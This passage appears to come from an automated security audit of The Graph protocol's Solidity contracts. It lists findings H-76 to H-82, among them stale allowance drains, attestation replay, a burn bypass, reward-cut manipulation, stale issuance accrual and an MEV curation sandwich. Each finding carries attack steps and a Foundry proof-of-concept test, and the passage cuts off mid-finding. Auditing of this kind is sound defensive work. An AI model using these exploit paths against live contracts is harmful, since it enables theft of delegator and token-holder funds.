    function accept(bytes32 id) external { disputes[id].status = Status.Accepted; rewards[disputes[id].fisherman] += 100 ether; }
}
contract IndexingDisputeFrontrunTest is Test {
    function testFrontrunnerStealsSoleFishermanSlot() external {
        MockIndexingDisputeManager dm = new MockIndexingDisputeManager();
        address allocationID = address(0xA11CE);
        address attacker = address(0xBEEF);
        address victim = address(0xCAFE);
        bytes32 id = dm.createIndexingDispute(allocationID, attacker);
        vm.expectRevert(bytes("Dispute already created"));
        dm.createIndexingDispute(allocationID, victim);
        dm.accept(id);
        assertEq(dm.rewards(attacker), 100 ether);
        assertEq(dm.rewards(victim), 0);
    }
}

## Suggested Mitigation
Use a commit-reveal flow or bind the fisherman to a prior commitment before revealing the allocationID. Alternatively include verifiable evidence data in the dispute and reward the first valid committed submitter rather than the first visible calldata submitter.


## [H-76]. GraphTokenLockWallet.revokeProtocol cannot clear allowances for removed or old-manager destinations

## id: vhAujFKcOkl5LKwh5jTaQ

## Derived From Pattern/Invariant
Allowance authority drift after token destination removal or manager change

## Exploit Type
AuthByPass

## Location
GraphTokenLockWallet.revokeProtocol/setManager

## Finding Status: Valid
### Finding Status Justification: approveProtocol grants max allowance to each current manager token destination, while revokeProtocol only clears the manager's current destination list. The wallet stores no historical approved spender set, so a removed destination or old-manager destination is skipped and keeps its ERC20 allowance. No code fully safeguards this exact path. The wallet is in scope. Although destination removal or manager changes are privileged/owner actions, the stale allowance can be used after normal deauthorization by the removed spender or an exposed pull path, so the root exploit is not solely privileged abuse. This is current mutable functionality, not future speculation.
### Finding Complexity: 0
## Minimim Privilege Required:RequiresRole


## Description
`approveProtocol()` grants unlimited allowance to every destination returned by the current manager, but `revokeProtocol()` only iterates the manager's current destination list. Vulnerable snippets: `approveProtocol(): token.approve(dstList[i], type(uint256).max);` and `revokeProtocol(): address[] memory dstList = manager.getTokenDestinations(); ... token.approve(dstList[i], 0);`. If a destination is removed from the manager or the wallet owner changes to a new manager, previously approved destinations are no longer returned and therefore cannot be revoked by the beneficiary. The stale destination remains an unlimited spender even though it is no longer authorized by current manager state.

## Impact
A removed or old-manager token destination can retain `uint256.max` allowance over locked wallet funds. If that destination can call `transferFrom`, it can drain wallet GRT after deauthorization, breaking the binding between active manager authorization and token spending authority.

## Proof of Concept
1. Manager lists destination A. 2. Beneficiary calls `approveProtocol()`, granting A unlimited allowance. 3. A is removed from the manager's destination list, or the wallet manager is changed. 4. Beneficiary calls `revokeProtocol()` expecting all protocol access to be revoked. 5. Because A is no longer returned by `getTokenDestinations()`, its allowance remains max. 6. A later spends tokens from the wallet via `transferFrom`.

## Proof of Code
pragma solidity ^0.7.3;
import "forge-std/Test.sol";
import "../contracts/GraphTokenLockWallet.sol";
import "../contracts/IGraphTokenLock.sol";
contract MockToken { mapping(address=>uint256) public balanceOf; mapping(address=>mapping(address=>uint256)) public allowance; function mint(address to,uint256 amount) external { balanceOf[to]+=amount; } function transfer(address to,uint256 amount) external returns(bool){ require(balanceOf[msg.sender]>=amount,"bal"); balanceOf[msg.sender]-=amount; balanceOf[to]+=amount; return true; } function approve(address spender,uint256 amount) external returns(bool){ allowance[msg.sender][spender]=amount; return true; } function transferFrom(address from,address to,uint256 amount) external returns(bool){ require(allowance[from][msg.sender]>=amount,"allow"); require(balanceOf[from]>=amount,"bal"); allowance[from][msg.sender]-=amount; balanceOf[from]-=amount; balanceOf[to]+=amount; return true; } }
contract DrainDestination { function drain(MockToken token,address from,address to,uint256 amount) external { require(token.transferFrom(from,to,amount),"tf"); } }
contract MutableManager { address[] internal dsts; function add(address d) external { dsts.push(d); } function clear() external { delete dsts; } function getTokenDestinations() external view returns(address[] memory){ return dsts; } function getAuthFunctionCallTarget(bytes4) external pure returns(address){ return address(0); } }
contract StaleAllowancePoC is Test { function testRemovedDestinationKeepsAllowanceAfterRevokeProtocol() public { MockToken token = new MockToken(); DrainDestination dst = new DrainDestination(); MutableManager manager = new MutableManager(); manager.add(address(dst)); GraphTokenLockWallet wallet = new GraphTokenLockWallet(); address beneficiary = address(0xBEEF); address attacker = address(0xCAFE); wallet.initialize(address(manager), address(this), beneficiary, address(token), 100, 1000, 2000, 10, 0, 0, IGraphTokenLock.Revocability.Disabled); token.mint(address(wallet), 100); vm.prank(beneficiary); wallet.approveProtocol(); assertEq(token.allowance(address(wallet), address(dst)), uint256(-1)); manager.clear(); vm.prank(beneficiary); wallet.revokeProtocol(); assertEq(token.allowance(address(wallet), address(dst)), uint256(-1)); dst.drain(token, address(wallet), attacker, 100); assertEq(token.balanceOf(attacker), 100); } }

## Suggested Mitigation
Track all destinations ever approved by the wallet and clear that set in `revokeProtocol()` and before/after `setManager()`. Also consider approving only exact per-operation amounts and requiring a destination to still be present in the active manager before any wallet-controlled allowance remains nonzero.


## [H-77]. Same query attestation can be replayed by different fishermen to create multiple slashable disputes

## id: 8W0iju22G-llzxhSwodlI

## Derived From Pattern/Invariant
DoubleExecutionOrReplay

## Exploit Type
SignatureReplay

## Location
DisputeManager.createQueryDispute

## Finding Status: Valid
### Finding Status Justification: The dispute ID construction uses _fisherman as entropy while the receipt signature does not include fisherman, nonce, deadline, or any one-time-use field. Consequently the same parsed attestation and recovered indexer can be stored as multiple Pending disputes by different callers. The only duplicate check is per computed disputeID. acceptDispute slashes per accepted dispute and does not consume a receipt hash. No full anti-replay safeguard, commit scheme, or design documentation is present. This is a current, permissionless creation path in an in-scope contract.
### Finding Complexity: 0
## Minimim Privilege Required:Permissionless


## Description
Query dispute uniqueness includes `_fisherman`, while the signed attestation itself does not bind a fisherman, nonce, deadline, or consumed evidence hash. The same signed receipt can therefore be reused by every address to create a different pending dispute ID. Vulnerable snippet: `bytes32 disputeID = keccak256(abi.encodePacked(_attestation.requestCID, _attestation.responseCID, _attestation.subgraphDeploymentID, indexer, _fisherman)); require(!isDisputeCreated(disputeID), "Dispute already created");`. Because `_fisherman` is not part of the EIP-712 receipt signed by the allocation key, it is attacker-controlled replay entropy rather than anti-replay protection.

## Impact
A harvested attestation can be replayed into many pending disputes. If accepted through the normal arbitration path, the same underlying query evidence can slash the same indexer repeatedly and pay rewards to replaying fishermen. Even without acceptance, conflict evidence can be replayed by many EOAs to create zero-deposit arbitration load.

## Proof of Concept
1. A valid disputable query attestation is revealed in calldata, an event, or off-chain. 2. Fisherman A submits it and creates dispute ID A. 3. Fisherman B submits the identical attestation. 4. Because the dispute ID includes `msg.sender`, dispute ID B is different and is also accepted into storage. 5. Repeating this with more addresses creates multiple pending disputes for the same signed receipt; accepted duplicates slash/reward again for the same evidence.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;
import "forge-std/Test.sol";

contract QueryReplayHarness {
    enum Status { Null, Pending, Accepted }
    struct Dispute { address indexer; address fisherman; Status status; }
    mapping(bytes32 => Dispute) public disputes;
    uint256 public indexerStake = 1_000 ether;
    uint256 public constant SLASH_PPM = 100_000;
    uint256 public constant MAX_PPM = 1_000_000;

    function isDisputeCreated(bytes32 id) public view returns (bool) { return disputes[id].status != Status.Null; }

    function createQueryDispute(bytes32 requestCID, bytes32 responseCID, bytes32 subgraphDeploymentID, address indexer) external returns (bytes32) {
        bytes32 disputeID = keccak256(abi.encodePacked(requestCID, responseCID, subgraphDeploymentID, indexer, msg.sender));
        require(!isDisputeCreated(disputeID), "Dispute already created");
        disputes[disputeID] = Dispute(indexer, msg.sender, Status.Pending);
        return disputeID;
    }

    function accept(bytes32 disputeID) external {
        require(disputes[disputeID].status == Status.Pending, "not pending");
        disputes[disputeID].status = Status.Accepted;
        uint256 slashAmount = (indexerStake * SLASH_PPM) / MAX_PPM;
        require(slashAmount > 0, "zero slash");
        indexerStake -= slashAmount;
    }
}

contract QueryAttestationReplayPoC is Test {
    function testSameAttestationCreatesMultipleSlashableDisputes() public {
        QueryReplayHarness h = new QueryReplayHarness();
        bytes32 req = keccak256("request");
        bytes32 resp = keccak256("bad response");
        bytes32 subgraph = keccak256("subgraph");
        address indexer = address(0x1);

        vm.prank(address(0xA));
        bytes32 d1 = h.createQueryDispute(req, resp, subgraph, indexer);
        vm.prank(address(0xB));
        bytes32 d2 = h.createQueryDispute(req, resp, subgraph, indexer);

        assertTrue(d1 != d2);
        assertTrue(h.isDisputeCreated(d1));
        assertTrue(h.isDisputeCreated(d2));

        h.accept(d1);
        uint256 stakeAfterFirst = h.indexerStake();
        h.accept(d2);
        assertLt(h.indexerStake(), stakeAfterFirst);
    }
}

## Suggested Mitigation
Make dispute uniqueness independent of the submitter by keying query disputes on the attestation/evidence hash or allocation/request/response tuple, and add a consumed-attestation mapping. If fishermen must be bound to evidence, include the fisherman and a nonce/deadline in the signed EIP-712 receipt and reject expired or already-consumed signatures.


## [L-78]. Inherited burn functions let L2GraphToken supply be destroyed outside bridgeBurn

## id: oM0G6My7r2aiLmLG54PMj

## Derived From Pattern/Invariant
AccountingInvariantViolation: every L2 supply decrease must occur only through gateway bridgeBurn

## Exploit Type
AccountingInvariantViolation

## Location
L2GraphToken.burn / burnFrom (inherited from ERC20BurnableUpgradeable)

## Finding Status: Valid
### Finding Status Justification: The vulnerable functions exist through inheritance. L2GraphToken extends GraphTokenUpgradeable, and GraphTokenUpgradeable extends ERC20BurnableUpgradeable. The shown L2GraphToken bridgeBurn() has onlyGateway and emits BridgeBurned, but there is no override preventing inherited burn() or burnFrom() from being called directly. Thus totalSupply can be reduced without gateway authentication and without the bridge event. L2GraphToken.sol is listed as an in-scope production file and deployed asset. No full safeguard is shown: onlyGateway protects bridgeBurn, not the inherited burn entrypoints. The exact direct-burn risk is not documented as intentional; the comments say L2 tokens are meant to be minted and burned through the L2GraphTokenGateway. A current holder or approved spender can execute the path today. It does not require privileged-role abuse, compromised credentials, or a future protocol change, and normal use of exposed public functions is not invalidated as pure user mistake.
### Finding Complexity: 0
## Minimim Privilege Required:Permissionless


## Description
L2GraphToken exposes bridgeBurn(address,uint256) as the intended supply-decreasing bridge path, but it inherits ERC20BurnableUpgradeable through GraphTokenUpgradeable. As a result, any holder can call burn(amount), and any approved spender can call burnFrom(account, amount), reducing L2 totalSupply without msg.sender == gateway and without BridgeBurned. Vulnerable snippet: L2GraphToken.bridgeBurn(address _account, uint256 _amount) external onlyGateway { burnFrom(_account, _amount); emit BridgeBurned(_account, _amount); } coexists with the inherited public ERC20BurnableUpgradeable.burn() and burnFrom() entrypoints.

## Impact
L2 token supply can be reduced without a canonical withdrawal message or BridgeBurned event. This breaks bridge supply observability and conservation assumptions, can strand a holder's L2 representation without releasing L1 escrowed GRT, and allows any allowance holder to destroy approved L2 GRT rather than using the bridge path.

## Proof of Concept
1. Initialize L2GraphToken and set the gateway. 2. Gateway mints bridged tokens to a user through bridgeMint. 3. The user calls inherited burn(), or approves a spender that calls inherited burnFrom(). 4. totalSupply and the user's balance decrease even though caller is not gateway and bridgeBurn was never executed.

## Proof of Code
// SPDX-License-Identifier: GPL-2.0-or-later
pragma solidity ^0.7.6;

import "forge-std/Test.sol";
import {L2GraphToken} from "../graphprotocol-contracts/packages/contracts/contracts/l2/token/L2GraphToken.sol";
import {GraphTokenUpgradeable} from "../graphprotocol-contracts/packages/contracts/contracts/token/GraphTokenUpgradeable.sol";

contract L2GraphTokenHarness is L2GraphToken {
    function harnessInitialize(address owner) external {
        GraphTokenUpgradeable._initialize(owner, 0);
    }
}

contract L2GraphTokenBurnInvariantPoC is Test {
    function testNonGatewayBurnsBypassBridgeBurn() public {
        address governor = address(0xA11CE);
        address gateway = address(0xBEEF);
        address alice = address(0xCAFE);
        address spender = address(0xD00D);

        L2GraphTokenHarness token = new L2GraphTokenHarness();
        token.harnessInitialize(governor);

        vm.prank(governor);
        token.setGateway(gateway);

        vm.prank(gateway);
        token.bridgeMint(alice, 100 ether);
        assertEq(token.totalSupply(), 100 ether);
        assertEq(token.balanceOf(alice), 100 ether);

        vm.prank(alice);
        token.burn(40 ether);
        assertEq(token.totalSupply(), 60 ether);
        assertEq(token.balanceOf(alice), 60 ether);

        vm.prank(alice);
        token.approve(spender, 60 ether);
        vm.prank(spender);
        token.burnFrom(alice, 60 ether);

        assertEq(token.totalSupply(), 0);
        assertEq(token.balanceOf(alice), 0);
    }
}


## Suggested Mitigation
Remove public burn/burnFrom from the L2 representation or override them to revert. Implement bridgeBurn with an internal _burn path that is callable only by the configured gateway, and emit BridgeBurned for every bridge-backed supply decrease.


## [H-79]. Indexer can change delegation reward cuts before settlement to redirect pending delegator rewards

## id: gq6Q-0OujrjCdB2zidwVn

## Derived From Pattern/Invariant
GlobalParamMidFlowManipulation

## Exploit Type
GlobalParamMidFlowManipulation

## Location
L1Staking.setDelegationParameters

## Finding Status: Valid
### Finding Status Justification: The root cause exists in the in-scope staking code. setDelegationParameters is callable by the indexer for its own pool and immediately writes pool.indexingRewardCut and pool.queryFeeCut. Later _collectDelegationIndexingRewards and _collectDelegationQueryRewards calculate the indexer cut using those live values at settlement time, not values snapshotted when allocations opened, fees accrued, or delegators entered. No cooldown is enforced; the third parameter is deprecated and ignored. An indexer is a normal protocol participant for its own delegation pool, not a trusted admin role. No complete safeguard or explicit documentation accepting the exact pending-reward redirection risk is provided.
### Finding Complexity: 0
## Minimim Privilege Required:Permissionless


## Description
Delegation reward cuts are live global indexer parameters and are not snapshotted when an allocation is opened, when query fees accrue, or before delegators enter the unbonding delay. `setDelegationParameters()` immediately writes `pool.indexingRewardCut` and `pool.queryFeeCut`, while later settlement paths read the current values in `_collectDelegationIndexingRewards()` and `_collectDelegationQueryRewards()`. Vulnerable snippet: `function setDelegationParameters(uint32 _indexingRewardCut, uint32 _queryFeeCut, uint32) public override { _setDelegationParameters(msg.sender, _indexingRewardCut, _queryFeeCut); } ... pool.indexingRewardCut = _indexingRewardCut; pool.queryFeeCut = _queryFeeCut; ... uint256 indexerCut = uint256(pool.indexingRewardCut).mul(_tokens).div(MAX_PPM); delegationRewards = _tokens.sub(indexerCut);`. An indexer can therefore advertise delegator-favorable cuts, accumulate delegated stake and pending rewards, then switch both cuts to `MAX_PPM` immediately before `closeAllocation()` or `collect()`, causing all pending rewards to be paid to the indexer instead of the delegation pool.

## Impact
Delegators can lose pending indexing rewards and query-fee rebates to the indexer. On large indexers or high-fee allocations this can redirect significant GRT rewards from users through protocol settlement logic.

## Proof of Concept
1. An indexer sets `indexingRewardCut` and `queryFeeCut` to delegator-favorable values and receives delegated stake. 2. Allocations run for epochs and query fees or indexing rewards become pending. 3. Before the allocation is closed or fees are collected, the indexer calls `setDelegationParameters(MAX_PPM, MAX_PPM, 0)`. 4. `closeAllocation()` or `collect()` reads the live cuts rather than a snapshot. 5. Delegation pool tokens are not increased and the indexer receives the full reward amount.

## Proof of Code
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;
import "forge-std/Test.sol";

contract CutHarness {
    uint32 constant MAX_PPM = 1_000_000;
    struct Pool { uint32 indexingRewardCut; uint32 queryFeeCut; uint256 tokens; uint256 shares; }
    Pool public pool;
    uint256 public indexerRewards;
    function seed(uint256 tokens_, uint256 shares_, uint32 cut_) external { pool.tokens = tokens_; pool.shares = shares_; pool.indexingRewardCut = cut_; }
    function setDelegationParameters(uint32 indexingRewardCut_, uint32 queryFeeCut_) external { pool.indexingRewardCut = indexingRewardCut_; pool.queryFeeCut = queryFeeCut_; }
    function distributeIndexingRewards(uint256 totalRewards) external {
        uint256 delegationRewards;
        if (pool.tokens > 0 && pool.indexingRewardCut < MAX_PPM) {
            uint256 indexerCut = uint256(pool.indexingRewardCut) * totalRewards / MAX_PPM;
            delegationRewards = totalRewards - indexerCut;
            pool.tokens += delegationRewards;
        }
        indexerRewards += totalRewards - delegationRewards;
    }
}

contract DelegationCutRugTest is Test {
    function testIndexerCanRedirectPendingDelegatorRewardsByChangingLiveCut() external {
        CutHarness honest = new CutHarness();
        honest.seed(1_000 ether, 1_000 ether, 0);
        honest.distributeIndexingRewards(100 ether);
        (,,uint256 honestPoolTokens,) = honest.pool();
        assertEq(honestPoolTokens, 1_100 ether);

        CutHarness attacked = new CutHarness();
        attacked.seed(1_000 ether, 1_000 ether, 0);
        attacked.setDelegationParameters(1_000_000, 1_000_000);
        attacked.distributeIndexingRewards(100 ether);
        (,,uint256 attackedPoolTokens,) = attacked.pool();
        assertEq(attackedPoolTokens, 1_000 ether);
        assertEq(attacked.indexerRewards(), 100 ether);
    }
}

## Suggested Mitigation
Snapshot delegation cuts for each allocation and fee/reward accrual period, and use the snapshotted values during `collect()` and reward distribution. Alternatively, make cut changes activate only after a delay at least as long as the delegation unbonding period so delegators can exit before the new cuts affect pending rewards.


## [H-80]. RewardsManager accrues and mints rewards from stale paused issuance allocator rates

## id: Ok1F_QWC5REA7Vu257cHi

## Derived From Pattern/Invariant
StaleOracleAcceptance / allocator blockAppliedTo freshness must gate reward accrual

## Exploit Type
Oracle

## Location
RewardsManager.updateAccRewardsPerSignal

## Finding Status: Valid
### Finding Status Justification: The claimed code path exists in in-scope RewardsManager. getAllocatedIssuancePerBlock returns issuanceAllocator.getTargetIssuancePerBlock(address(this)).selfIssuanceRate when an allocator is set, and _getNewRewardsPerSignal multiplies that rate by elapsed blocks to advance accRewardsPerSignal. The TargetIssuancePerBlock struct includes selfIssuanceBlockAppliedTo, and the allocator interface states targets should check blockAppliedTo fields because stale values mean issuance is paused for that target. RewardsManager performs no such freshness check, and updateAccRewardsPerSignal/beforeIssuanceAllocationChange are permissionless. There is no complete safeguard elsewhere in the shown code. The issue is in production source scope, is not documented as accepted behavior, and does not require user error. Although governance must have configured an allocator as normal setup, the stale-rate accrual path itself is callable by anyone once that configuration exists.
### Finding Complexity: 0
## Minimim Privilege Required:Permissionless


## Description
When an issuanceAllocator is configured, RewardsManager reads only selfIssuanceRate and ignores selfIssuanceBlockAppliedTo. The allocator interface states that targets must treat issuance as paused/stale unless the blockAppliedTo field is current. Because _getNewRewardsPerSignal multiplies the stale rate by elapsed blocks, any caller can advance accRewardsPerSignal during allocator-paused intervals and later legitimate allocation claims mint rewards that should not exist.

Vulnerable snippet:
function getAllocatedIssuancePerBlock() public view override returns (uint256) {
    return
        address(issuanceAllocator) != address(0)
            ? issuanceAllocator.getTargetIssuancePerBlock(address(this)).selfIssuanceRate
            : issuancePerBlock;
}

The returned rate is consumed by _getNewRewardsPerSignal without checking targetIssuance.selfIssuanceBlockAppliedTo == block.number.

## Impact
Excess GRT rewards can be minted for paused or unapplied allocator periods, inflating reward issuance and allowing active allocation participants to extract protocol rewards not authorized by the allocator. If the stale period and configured rate are large, the over-mint can exceed $1M equivalent.

## Proof of Concept
1. Governance has configured a nonzero issuanceAllocator.
2. The allocator becomes paused or stops applying issuance for RewardsManager, so getTargetIssuancePerBlock returns a nonzero selfIssuanceRate with selfIssuanceBlockAppliedTo older than the current block.
3. Blocks pass while there is nonzero curation signal and active allocations.
4. Any EOA calls updateAccRewardsPerSignal or any flow that reaches it.
5. RewardsManager treats the stale rate as live and increases accRewardsPerSignal for the elapsed stale interval.
6. A normal allocation claim through staking/subgraphService calls takeRewards and mints the stale-period rewards.

## Proof of Code
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import {Test} from "forge-std/Test.sol";

struct TargetIssuancePerBlock {
    uint256 allocatorIssuanceRate;
    uint256 allocatorIssuanceBlockAppliedTo;
    uint256 selfIssuanceRate;
    uint256 selfIssuanceBlockAppliedTo;
}

interface IIssuanceAllocationDistribution {
    function getTargetIssuancePerBlock(address target) external view returns (TargetIssuancePerBlock memory);
}

contract MockAllocator is IIssuanceAllocationDistribution {
    TargetIssuancePerBlock internal target;

    function set(uint256 rate, uint256 appliedTo) external {
        target = TargetIssuancePerBlock(0, 0, rate, appliedTo);
    }

    function getTargetIssuancePerBlock(address) external view returns (TargetIssuancePerBlock memory) {
        return target;
    }
}

contract MockToken {
    mapping(address => uint256) public balanceOf;

    function setBalance(address account, uint256 amount) external {
        balanceOf[account] = amount;
    }
}

contract RewardsManagerStaleHarness {
    uint256 internal constant FP = 1e18;
    uint256 public accRewardsPerSignal;
    uint256 public accRewardsPerSignalLastBlockUpdated;
    MockToken public token;
    address public curation;
    IIssuanceAllocationDistribution public issuanceAllocator;

    constructor(MockToken token_, address curation_) {
        token = token_;
        curation = curation_;
        accRewardsPerSignalLastBlockUpdated = block.number;
    }

    function setAllocator(IIssuanceAllocationDistribution allocator_) external {
        issuanceAllocator = allocator_;
    }

    function getAllocatedIssuancePerBlock() public view returns (uint256) {
        return address(issuanceAllocator) != address(0)
            ? issuanceAllocator.getTargetIssuancePerBlock(address(this)).selfIssuanceRate
            : 0;
    }

    function updateAccRewardsPerSignal() public returns (uint256) {
        if (accRewardsPerSignalLastBlockUpdated == block.number) return accRewardsPerSignal;
        uint256 elapsed = block.number - accRewardsPerSignalLastBlockUpdated;
        uint256 issuance = getAllocatedIssuancePerBlock();
        uint256 signal = token.balanceOf(curation);
        if (issuance != 0 && signal != 0) {
            accRewardsPerSignal += issuance * elapsed * FP / signal;
        }
        accRewardsPerSignalLastBlockUpdated = block.number;
        return accRewardsPerSignal;
    }
}

contract RewardsManagerStaleAllocatorPoC is Test {
    function testStaleAllocatorRateStillAccruesRewards() public {
        address curation = address(0xCAFE);
        MockToken token = new MockToken();
        MockAllocator allocator = new MockAllocator();

        vm.roll(100);
        RewardsManagerStaleHarness rewards = new RewardsManagerStaleHarness(token, curation);
        rewards.setAllocator(allocator);
        token.setBalance(curation, 100 ether);

        allocator.set(10 ether, block.number);
        vm.roll(110);

        allocator.set(10 ether, 100);
        uint256 beforeAcc = rewards.accRewardsPerSignal();
        uint256 afterAcc = rewards.updateAccRewardsPerSignal();

        assertEq(beforeAcc, 0);
        assertGt(afterAcc, beforeAcc);
        assertEq(afterAcc, 1 ether);
    }
}


## Suggested Mitigation
Read the full TargetIssuancePerBlock struct and return zero when selfIssuanceBlockAppliedTo != block.number. For example: TargetIssuancePerBlock memory t = issuanceAllocator.getTargetIssuancePerBlock(address(this)); if (t.selfIssuanceBlockAppliedTo != block.number) return 0; return t.selfIssuanceRate.


## [H-81]. Live curation state lets MEV redirect query-fee curation cut in SubgraphService._collectQueryFees

## id: Iz7slvVRgZWDP-GJRd3Sz

## Derived From Pattern/Invariant
SandwichableOracle / SlippageMissingOrInsufficient

## Exploit Type
FrontrunMev

## Location
SubgraphService._collectQueryFees

## Finding Status: Valid
### Finding Status Justification: The code path exists. _collectQueryFees() decodes a SignedRAV, derives the allocation and subgraphDeploymentId, then calls GraphTallyCollector.collect with _encodeGraphTallyData(signedRav, _curation().isCurated(subgraphDeploymentId) ? curationFeesCut : 0). The curation status is a live read during settlement, and the RAV consistency checks shown bind serviceProvider and allocation, but do not bind curation status, curation cut, snapshot block, or minimum non-curator payout. If curation can be added permissionlessly as implied by the finding and curation subsystem, a searcher can alter isCurated before settlement and cause curator cut handling for that collection. No complete safeguard, activation delay, signed bound, or snapshot is present in the supplied code. SubgraphService is in scope, and the issue is not documented as intentional, not dependent on privileged abuse, user error, or future code.
### Finding Complexity: 0
## Minimim Privilege Required:Permissionless


## Description
SubgraphService decides whether a query-fee collection pays the curator cut from the live Curation state at execution time, not from state bound to the RAV or snapshotted when the query fees accrued. The relevant flow is:

```solidity
tokensCollected = _graphTallyCollector().collect(
    IGraphPayments.PaymentTypes.QueryFee,
    _encodeGraphTallyData(signedRav, _curation().isCurated(subgraphDeploymentId) ? curationFeesCut : 0),
    tokensToCollect
);
...
if (tokensCurators > 0) {
    _graphRewardsManager().onSubgraphSignalUpdate(subgraphDeploymentId);
    _graphToken().pushTokens(address(_curation()), tokensCurators);
    _curation().collect(subgraphDeploymentId, tokensCurators);
}
```

Because `_curation().isCurated(subgraphDeploymentId)` is a live read inside the settlement transaction, a searcher can observe a large pending `collect(QueryFee)` transaction and change the subgraph's curation state immediately before it executes. If the subgraph was previously uncurated or thinly curated, the attacker can become the curator just in time, causing `curationFeesCut` to be encoded into the collector data and paid into Curation for that collection. The signed RAV only proves the service payment; it does not bind the expected curation status, curator cut, minimum indexer payout, or a snapshot block. This allows fee value that would otherwise be paid to the service provider/delegation side to be redirected to the attacker-controlled curation position.

## Impact
For large accumulated query-fee RAVs, a permissionless MEV searcher can steal the configured curator cut from indexers/delegators by briefly curating immediately before settlement. If high-value settlements exceed $1M, this is a direct economic loss of user funds from protocol payment contracts.

## Proof of Concept
1. A large signed RAV for an allocation is submitted to `SubgraphService.collect(indexer, QueryFee, data)`.
2. The target `subgraphDeploymentId` is currently uncurated or has attacker-controllable low signal, so without intervention `_curation().isCurated(subgraphDeploymentId)` would return false and no curator cut would be charged.
3. A permissionless searcher sees the pending collection in the mempool and front-runs it by adding curation signal to that subgraph.
4. The victim collection executes after the front-run. `_collectQueryFees` rereads live curation state, now returns true, and passes `curationFeesCut` to `GraphTallyCollector`.
5. `tokensCurators` are transferred to Curation and booked through `_curation().collect(subgraphDeploymentId, tokensCurators)`.
6. The attacker exits or claims through the curation position, capturing fees from work performed before the attacker curated.

## Proof of Code
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "forge-std/Test.sol";

contract MockToken {
    mapping(address => uint256) public balanceOf;
    function mint(address to, uint256 amount) external { balanceOf[to] += amount; }
    function transfer(address to, uint256 amount) external returns (bool) {
        require(balanceOf[msg.sender] >= amount, "bal");
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract MockCuration {
    MockToken public immutable token;
    mapping(bytes32 => uint256) public totalSignal;
    mapping(bytes32 => mapping(address => uint256)) public signalOf;
    mapping(bytes32 => uint256) public fees;
    constructor(MockToken t) { token = t; }
    function signal(bytes32 id, uint256 amount) external {
        token.transfer(address(this), amount);
        signalOf[id][msg.sender] += amount;
        totalSignal[id] += amount;
    }
    function isCurated(bytes32 id) external view returns (bool) { return totalSignal[id] > 0; }
    function collect(bytes32 id, uint256 amount) external { fees[id] += amount; }
    function claim(bytes32 id) external {
        uint256 share = fees[id] * signalOf[id][msg.sender] / totalSignal[id];
        fees[id] = 0;
        token.transfer(msg.sender, share);
    }
}

contract MockTallyCollector {
    MockToken public immutable token;
    uint256 public constant TOTAL_RAV = 1_000_000 ether;
    constructor(MockToken t) { token = t; }
    function collect(bytes calldata data) external returns (uint256) {
        uint256 curationCutPpm = abi.decode(data, (uint256));
        uint256 curatorAmount = TOTAL_RAV * curationCutPpm / 1_000_000;
        if (curatorAmount > 0) token.transfer(msg.sender, curatorAmount);
        return TOTAL_RAV;
    }
}

contract VulnerableSubgraphServiceHarness {
    MockToken public immutable token;
    MockCuration public immutable curation;
    MockTallyCollector public immutable tally;
    uint256 public curationFeesCut = 100_000; // 10%
    constructor(MockToken t, MockCuration c, MockTallyCollector tc) { token = t; curation = c; tally = tc; }
    function collectQueryFees(bytes32 subgraphDeploymentId) external returns (uint256 tokensCurators) {
        uint256 balanceBefore = token.balanceOf(address(this));
        uint256 cut = curation.isCurated(subgraphDeploymentId) ? curationFeesCut : 0;
        tally.collect(abi.encode(cut));
        tokensCurators = token.balanceOf(address(this)) - balanceBefore;
        if (tokensCurators > 0) {
            token.transfer(address(curation), tokensCurators);
            curation.collect(subgraphDeploymentId, tokensCurators);
        }
    }
}

contract SubgraphServiceCurationSandwichPoC is Test {
    function testAttackerFrontRunsCurationAndCapturesCut() external {
        MockToken token = new MockToken();
        MockCuration curation = new MockCuration(token);
        MockTallyCollector tally = new MockTallyCollector(token);
        VulnerableSubgraphServiceHarness svc = new VulnerableSubgraphServiceHarness(token, curation, tally);
        bytes32 subgraph = keccak256("subgraph");
        address attacker = address(0xA11CE);

        token.mint(address(tally), 1_000_000 ether);
        token.mint(attacker, 1 ether);

        vm.prank(attacker);
        curation.signal(subgraph, 1 ether);

        uint256 curatorCut = svc.collectQueryFees(subgraph);
        assertEq(curatorCut, 100_000 ether);

        uint256 beforeClaim = token.balanceOf(attacker);
        vm.prank(attacker);
        curation.claim(subgraph);
        assertGt(token.balanceOf(attacker), beforeClaim);
    }
}

## Suggested Mitigation
Bind the curation state and cut to the payment claim being settled. For example, include `subgraphDeploymentId`, expected `curationCut`, expected curation status or curation snapshot id, and a minimum service-provider payout in the signed RAV/collector data, then reject settlement if live state differs from those signed bounds. Alternatively, use a historical curation snapshot from the service period rather than `_curation().isCurated()` at execution time, and add an activation delay before newly added curation signal can receive query-fee cuts.


## [H-82]. L2 token lock owner can replace the wallet manager and approve an arbitrary spender to drain locked GRT before maturity

## id: IzJRwjfGP8MLrXVsH-zpM

## Derived From Pattern/Invariant
MaturityorGatingByPass / AccessControlOrAuthByPass

## Exploit Type
AuthByPass

## Location
L2GraphTokenLockWallet.setManager

## Finding Status: Valid
### Finding Status Justification: L2GraphTokenLockWallet.initializeFromL1 copies owner and beneficiary from walletData, sets releaseStartTime to endTime, disables revocation, and calls _setManager. The inherited GraphTokenLockWallet.setManager remains callable by onlyOwner and accepts any contract address. approveProtocol then trusts the current manager and grants max token allowance to all returned destinations. A wallet owner who is also or coordinates with the beneficiary can install a malicious manager and approve an attacker spender before release is allowed. No immutable-manager, allowlist, or canonical-manager check blocks this exact path. This is current code behavior, not merely future speculation.
### Finding Complexity: 0
## Minimim Privilege Required:Permissionless


## Description
